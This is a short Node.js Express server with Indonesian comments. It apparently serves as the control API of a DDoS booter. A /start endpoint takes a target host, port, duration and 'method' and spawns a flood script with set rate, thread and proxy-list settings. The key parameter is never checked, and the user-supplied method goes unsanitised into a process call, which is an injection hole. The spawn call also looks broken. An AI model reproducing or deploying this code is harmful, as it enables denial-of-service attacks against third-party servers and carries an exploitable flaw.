const express = require('express');
const { spawn } = require('child_process');
const os = require('os');

const app = express();
const PORT = 8080;
// Ganti rps thread proxynya sesuai yg mau di pakai
const rps = "15";
const thread = "8";
const proxy = "proxy.txt";

app.get('/start', (req, res) => {
    const { key, host, port, time, method } = req.query;

    // Validasi parameter
    if (!key || !host || !port || !time || !method) {
        return res.status(400).json({ error: 'Parameter tidak lengkap' });
    }

    // Memulai proses child untuk menjalankan perintah
    const child = spawn('screen node', [method, host, time, rps, thread, proxy]);

    child.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
    });

    child.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
    });

    child.on('close', (code) => {
        console.log(`Child process exited with code ${code}`);
    });

    res.status(200).json({ message: 'Perintah diterima dan diproses' });
});

app.listen(PORT, () => {
    const interfaces = os.networkInterfaces();
    const addresses = [];

    for (let interfaceName in interfaces) {
        for (let i = 0; i < interfaces[interfaceName].length; i++) {
            const address = interfaces[interfaceName][i];
            if (address.family === 'IPv4' && !address.internal) {
                addresses.push(address.address);
            }
        }
    }

    console.log(`Server berjalan di port ${PORT}`);
    addresses.forEach(address => {
        console.log(`Server dapat diakses di: http://${address}:${PORT}`);
    });
});